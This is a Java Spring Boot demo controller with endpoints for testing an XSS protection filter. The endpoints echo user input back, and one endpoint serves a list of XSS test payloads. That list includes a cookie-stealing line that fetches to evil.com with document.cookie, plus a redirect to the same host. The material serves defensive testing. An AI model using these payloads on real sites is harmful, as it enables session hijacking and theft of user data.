package com.chua.starter.plugin.controller;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.Map;

/**
 * XSS防护演示控制器
 * 
 * @author CH
 * @since 2025/1/16
 */
@Slf4j
@RestController
@RequestMapping("/api/demo/xss")
@RequiredArgsConstructor
public class XssDemoController {

    /**
     * 测试XSS防护 - GET请求
     */
    @GetMapping("/test")
    public ResponseEntity<Map<String, Object>> testXssGet(
            @RequestParam(required = false) String input,
            @RequestParam(required = false) String comment) {
        
        Map<String, Object> response = new HashMap<>();
        response.put("success", true);
        response.put("message", "XSS防护测试成功");
        response.put("receivedInput", input);
        response.put("receivedComment", comment);
        response.put("timestamp", System.currentTimeMillis());
        
        log.info("XSS test GET request - input: {}, comment: {}", input, comment);
        
        return ResponseEntity.ok(response);
    }

    /**
     * 测试XSS防护 - POST请求
     */
    @PostMapping("/test")
    public ResponseEntity<Map<String, Object>> testXssPost(@RequestBody Map<String, Object> requestData) {
        
        Map<String, Object> response = new HashMap<>();
        response.put("success", true);
        response.put("message", "XSS防护测试成功");
        response.put("receivedData", requestData);
        response.put("timestamp", System.currentTimeMillis());
        
        log.info("XSS test POST request - data: {}", requestData);
        
        return ResponseEntity.ok(response);
    }

    /**
     * 测试XSS防护 - 表单提交
     */
    @PostMapping("/form")
    public ResponseEntity<Map<String, Object>> testXssForm(
            @RequestParam String username,
            @RequestParam String email,
            @RequestParam(required = false) String bio,
            @RequestParam(required = false) String website) {
        
        Map<String, Object> response = new HashMap<>();
        response.put("success", true);
        response.put("message", "表单提交成功");
        
        Map<String, Object> formData = new HashMap<>();
        formData.put("username", username);
        formData.put("email", email);
        formData.put("bio", bio);
        formData.put("website", website);
        
        response.put("formData", formData);
        response.put("timestamp", System.currentTimeMillis());
        
        log.info("XSS test form submission - username: {}, email: {}, bio: {}, website: {}", 
            username, email, bio, website);
        
        return ResponseEntity.ok(response);
    }

    /**
     * 测试XSS防护 - 搜索功能
     */
    @GetMapping("/search")
    public ResponseEntity<Map<String, Object>> testXssSearch(
            @RequestParam String query,
            @RequestParam(defaultValue = "1") int page,
            @RequestParam(defaultValue = "10") int size,
            @RequestParam(required = false) String category) {
        
        Map<String, Object> response = new HashMap<>();
        response.put("success", true);
        response.put("message", "搜索完成");
        
        Map<String, Object> searchParams = new HashMap<>();
        searchParams.put("query", query);
        searchParams.put("page", page);
        searchParams.put("size", size);
        searchParams.put("category", category);
        
        response.put("searchParams", searchParams);
        response.put("results", "模拟搜索结果");
        response.put("timestamp", System.currentTimeMillis());
        
        log.info("XSS test search - query: {}, page: {}, size: {}, category: {}", 
            query, page, size, category);
        
        return ResponseEntity.ok(response);
    }

    /**
     * 测试XSS防护 - 评论功能
     */
    @PostMapping("/comment")
    public ResponseEntity<Map<String, Object>> testXssComment(
            @RequestParam String content,
            @RequestParam(required = false) String author,
            @RequestParam(required = false) String email,
            @RequestParam(required = false) String url) {
        
        Map<String, Object> response = new HashMap<>();
        response.put("success", true);
        response.put("message", "评论提交成功");
        
        Map<String, Object> commentData = new HashMap<>();
        commentData.put("content", content);
        commentData.put("author", author);
        commentData.put("email", email);
        commentData.put("url", url);
        
        response.put("commentData", commentData);
        response.put("timestamp", System.currentTimeMillis());
        
        log.info("XSS test comment - content: {}, author: {}, email: {}, url: {}", 
            content, author, email, url);
        
        return ResponseEntity.ok(response);
    }

    /**
     * 获取XSS测试用例
     */
    @GetMapping("/test-cases")
    public ResponseEntity<Map<String, Object>> getXssTestCases() {
        Map<String, Object> response = new HashMap<>();
        
        // 常见的XSS攻击载荷
        String[] testCases = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "<script>document.cookie</script>",
            "<script>window.location='http://evil.com'</script>",
            "<img src=x onerror=fetch('http://evil.com?cookie='+document.cookie)>"
        };
        
        response.put("testCases", testCases);
        response.put("description", "常见XSS攻击载荷，用于测试防护效果");
        response.put("warning", "仅用于安全测试，请勿用于恶意攻击");
        
        return ResponseEntity.ok(response);
    }

    /**
     * XSS防护状态检查
     */
    @GetMapping("/status")
    public ResponseEntity<Map<String, Object>> getXssProtectionStatus() {
        Map<String, Object> response = new HashMap<>();
        response.put("xssProtectionEnabled", true);
        response.put("filterActive", true);
        response.put("protectionMode", "FILTER");
        response.put("message", "XSS防护已启用");
        response.put("timestamp", System.currentTimeMillis());
        
        return ResponseEntity.ok(response);
    }
}
